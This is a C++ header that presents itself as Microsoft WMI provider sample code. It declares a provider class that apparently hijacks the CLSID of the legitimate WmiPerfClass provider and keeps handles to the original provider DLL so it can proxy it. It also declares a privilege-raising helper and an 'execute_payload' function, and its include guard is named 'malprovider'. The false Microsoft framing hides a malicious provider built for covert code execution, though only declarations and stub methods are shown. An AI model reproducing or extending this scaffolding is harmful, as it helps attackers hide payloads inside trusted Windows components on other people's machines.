//*******************************************************************
//  sample.h
//  WMI Instance provider sample code
//
// Copyright (C) Microsoft. All Rights Reserved.
//
//*******************************************************************

#ifndef _malprovider_H_
#define _malprovider_H_

#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
// Windows Header Files
#define WINVER 0x0501
#include <windows.h>

#ifdef __cplusplus

#include <wbemprov.h>
#pragma comment(lib, "wbemuuid.lib")
#include <initguid.h>

// CLSID of the original WmiPerfClass provider : {661FF7F6 - F4D1 - 4593 - B59D - 4C54C1ECE68B}
DEFINE_GUID(CLSID_WmiPerfClass, 0x661FF7F6, 0xF4D1, 0x4593, 0xB5, 0x9D, 0x4C, 0x54, 0xC1, 0xEC, 0xE6, 0x8B);

typedef LPVOID* PPVOID;



// Provider interfaces are provided by objects of this class
class WmiPerfClass : public IWbemServices, public IWbemProviderInit
{
protected:
    ULONG m_cRef;         //Object reference count
    IWbemServices* m_pNamespace;
public:
    WmiPerfClass(BSTR ObjectPath = NULL, BSTR User = NULL, BSTR Password = NULL, IWbemContext* pCtx = NULL);
    ~WmiPerfClass(void);

    //IUnknown
    STDMETHODIMP QueryInterface(REFIID, PPVOID);
    STDMETHODIMP_(ULONG) AddRef(void);
    STDMETHODIMP_(ULONG) Release(void);

    //IWbemProviderInit
    HRESULT STDMETHODCALLTYPE Initialize(
        /* [in] */ LPWSTR pszUser,
        /* [in] */ LONG lFlags,
        /* [in] */ LPWSTR pszNamespace,
        /* [in] */ LPWSTR pszLocale,
        /* [in] */ IWbemServices* pNamespace,
        /* [in] */ IWbemContext* pCtx,
        /* [in] */ IWbemProviderInitSink* pInitSink
    );

    //IWbemServices  
    // supported
    HRESULT STDMETHODCALLTYPE CreateClassEnumAsync(
        /* [in] */ const BSTR Superclass,
        /* [in] */ long lFlags,
        /* [in] */ IWbemContext __RPC_FAR* pCtx,
        /* [in] */ IWbemObjectSink __RPC_FAR* pResponseHandler);

    // supported
    HRESULT STDMETHODCALLTYPE GetObjectAsync(
        /* [in] */ const BSTR ObjectPath,
        /* [in] */ long lFlags,
        /* [in] */ IWbemContext __RPC_FAR* pCtx,
        /* [in] */ IWbemObjectSink __RPC_FAR* pResponseHandler);
    

    HRESULT STDMETHODCALLTYPE OpenNamespace(
        /* [in] */ const BSTR Namespace,
        /* [in] */ long lFlags,
        /* [in] */ IWbemContext __RPC_FAR* pCtx,
        /* [unique][in][out] */ IWbemServices __RPC_FAR* __RPC_FAR* ppWorkingNamespace,
        /* [unique][in][out] */ IWbemCallResult __RPC_FAR* __RPC_FAR* ppResult)
    {
        return WBEM_E_NOT_SUPPORTED;
    };

    HRESULT STDMETHODCALLTYPE CancelAsyncCall(
        /* [in] */ IWbemObjectSink __RPC_FAR* pSink)
    {
        return WBEM_E_NOT_SUPPORTED;
    };

    HRESULT STDMETHODCALLTYPE QueryObjectSink(
        /* [in] */ long lFlags,
        /* [out] */ IWbemObjectSink __RPC_FAR* __RPC_FAR* ppResponseHandler)
    {
        return WBEM_E_NOT_SUPPORTED;
    };

    HRESULT STDMETHODCALLTYPE GetObject(
        /* [in] */ const BSTR ObjectPath,
        /* [in] */ long lFlags,
        /* [in] */ IWbemContext __RPC_FAR* pCtx,
        /* [unique][in][out] */ IWbemClassObject __RPC_FAR* __RPC_FAR* ppObject,
        /* [unique][in][out] */ IWbemCallResult __RPC_FAR* __RPC_FAR* ppCallResult)
    {
        return WBEM_E_NOT_SUPPORTED;
    };

    HRESULT STDMETHODCALLTYPE PutClass(
        /* [in] */ IWbemClassObject __RPC_FAR* pObject,
        /* [in] */ long lFlags,
        /* [in] */ IWbemContext __RPC_FAR* pCtx,
        /* [unique][in][out] */ IWbemCallResult __RPC_FAR* __RPC_FAR* ppCallResult)
    {
        return WBEM_E_NOT_SUPPORTED;
    };

    HRESULT STDMETHODCALLTYPE PutClassAsync(
        /* [in] */ IWbemClassObject __RPC_FAR* pObject,
        /* [in] */ long lFlags,
        /* [in] */ IWbemContext __RPC_FAR* pCtx,
        /* [in] */ IWbemObjectSink __RPC_FAR* pResponseHandler)
    {
        return WBEM_E_NOT_SUPPORTED;
    };

    HRESULT STDMETHODCALLTYPE DeleteClass(
        /* [in] */ const BSTR Class,
        /* [in] */ long lFlags,
        /* [in] */ IWbemContext __RPC_FAR* pCtx,
        /* [unique][in][out] */ IWbemCallResult __RPC_FAR* __RPC_FAR* ppCallResult)
    {
        return WBEM_E_NOT_SUPPORTED;
    };

    HRESULT STDMETHODCALLTYPE DeleteClassAsync(
        /* [in] */ const BSTR Class,
        /* [in] */ long lFlags,
        /* [in] */ IWbemContext __RPC_FAR* pCtx,
        /* [in] */ IWbemObjectSink __RPC_FAR* pResponseHandler)
    {
        return WBEM_E_NOT_SUPPORTED;
    };

    HRESULT STDMETHODCALLTYPE CreateClassEnum(
        /* [in] */ const BSTR Superclass,
        /* [in] */ long lFlags,
        /* [in] */ IWbemContext __RPC_FAR* pCtx,
        /* [out] */
        IEnumWbemClassObject __RPC_FAR* __RPC_FAR* ppEnum)
    {
        return WBEM_E_NOT_SUPPORTED;
    };

    HRESULT STDMETHODCALLTYPE PutInstance(
        /* [in] */ IWbemClassObject __RPC_FAR* pInst,
        /* [in] */ long lFlags,
        /* [in] */ IWbemContext __RPC_FAR* pCtx,
        /* [unique][in][out] */ IWbemCallResult __RPC_FAR* __RPC_FAR* ppCallResult)
    {
        return WBEM_E_NOT_SUPPORTED;
    };

    HRESULT STDMETHODCALLTYPE PutInstanceAsync(
        /* [in] */ IWbemClassObject __RPC_FAR* pInst,
        /* [in] */ long lFlags,
        /* [in] */ IWbemContext __RPC_FAR* pCtx,
        /* [in] */ IWbemObjectSink __RPC_FAR* pResponseHandler)
    {
        return WBEM_E_NOT_SUPPORTED;
    };

    HRESULT STDMETHODCALLTYPE DeleteInstance(
        /* [in] */ const BSTR ObjectPath,
        /* [in] */ long lFlags,
        /* [in] */ IWbemContext __RPC_FAR* pCtx,
        /* [unique][in][out] */ IWbemCallResult __RPC_FAR* __RPC_FAR* ppCallResult)
    {
        return WBEM_E_NOT_SUPPORTED;
    };

    HRESULT STDMETHODCALLTYPE DeleteInstanceAsync(
        /* [in] */ const BSTR ObjectPath,
        /* [in] */ long lFlags,
        /* [in] */ IWbemContext __RPC_FAR* pCtx,
        /* [in] */ IWbemObjectSink __RPC_FAR* pResponseHandler)
    {
        return WBEM_E_NOT_SUPPORTED;
    };

    HRESULT STDMETHODCALLTYPE CreateInstanceEnum(
        /* [in] */ const BSTR Class,
        /* [in] */ long lFlags,
        /* [in] */ IWbemContext __RPC_FAR* pCtx,
        /* [out] */ IEnumWbemClassObject __RPC_FAR* __RPC_FAR* ppEnum)
    {
        return WBEM_E_NOT_SUPPORTED;
    };

    HRESULT STDMETHODCALLTYPE CreateInstanceEnumAsync(
        /* [in] */ const BSTR Class,
        /* [in] */ long lFlags,
        /* [in] */ IWbemContext __RPC_FAR* pCtx,
        /* [in] */ IWbemObjectSink __RPC_FAR* pResponseHandler)
    {
        return WBEM_E_NOT_SUPPORTED;
    };

    HRESULT STDMETHODCALLTYPE ExecQuery(
        /* [in] */ const BSTR QueryLanguage,
        /* [in] */ const BSTR Query,
        /* [in] */ long lFlags,
        /* [in] */ IWbemContext __RPC_FAR* pCtx,
        /* [out] */ IEnumWbemClassObject __RPC_FAR* __RPC_FAR* ppEnum)
    {
        return WBEM_E_NOT_SUPPORTED;
    };

    HRESULT STDMETHODCALLTYPE ExecQueryAsync(
        /* [in] */ const BSTR QueryLanguage,
        /* [in] */ const BSTR Query,
        /* [in] */ long lFlags,
        /* [in] */ IWbemContext __RPC_FAR* pCtx,
        /* [in] */ IWbemObjectSink __RPC_FAR* pResponseHandler)
    {
        return WBEM_E_NOT_SUPPORTED;
    };

    HRESULT STDMETHODCALLTYPE ExecNotificationQuery(
        /* [in] */ const BSTR QueryLanguage,
        /* [in] */ const BSTR Query,
        /* [in] */ long lFlags,
        /* [in] */ IWbemContext __RPC_FAR* pCtx,
        /* [out] */ IEnumWbemClassObject __RPC_FAR* __RPC_FAR* ppEnum)
    {
        return WBEM_E_NOT_SUPPORTED;
    };

    HRESULT STDMETHODCALLTYPE ExecNotificationQueryAsync(
        /* [in] */ const BSTR QueryLanguage,
        /* [in] */ const BSTR Query,
        /* [in] */ long lFlags,
        /* [in] */ IWbemContext __RPC_FAR* pCtx,
        /* [in] */ IWbemObjectSink __RPC_FAR* pResponseHandler)
    {
        return WBEM_E_NOT_SUPPORTED;
    };

    HRESULT STDMETHODCALLTYPE ExecMethod(const BSTR,
        const BSTR,
        long,
        IWbemContext*,
        IWbemClassObject*,
        IWbemClassObject**,
        IWbemCallResult**)
    {
        return WBEM_E_NOT_SUPPORTED;
    }

    HRESULT STDMETHODCALLTYPE ExecMethodAsync(const BSTR,
        const BSTR,
        long,
        IWbemContext*,
        IWbemClassObject*,
        IWbemObjectSink*)
    {
        return WBEM_E_NOT_SUPPORTED;
    }

};


// This class is the class factory for WmiPerfClass objects.
class WmiPerfClassFactory : public IClassFactory
{
protected:
    ULONG m_cRef;

public:
    WmiPerfClassFactory(void);
    ~WmiPerfClassFactory(void);

    //IUnknown
    STDMETHODIMP QueryInterface(REFIID, PPVOID);
    STDMETHODIMP_(ULONG) AddRef(void);
    STDMETHODIMP_(ULONG) Release(void);

    //IClassFactory
    STDMETHODIMP CreateInstance(LPUNKNOWN, REFIID, PPVOID);
    STDMETHODIMP LockServer(BOOL);
};


// These variables keep track of
// when the module can be unloaded
extern long g_cObj;
extern long g_cLock;

extern HMODULE g_hOrgProviderDll;
extern IWbemServices* g_orgProviderWbemServices;

// General purpose utilities.  
DWORD GetCurrentImpersonationLevel();

BOOL SetPrivilege(
    HANDLE hToken,
    LPCTSTR lpszPrivilege,
    BOOL bEnablePrivilege
);

// payload execution functionality
extern "C"
{
    int execute_payload();
};

#endif //#ifdef __cplusplus

#endif#pragma once
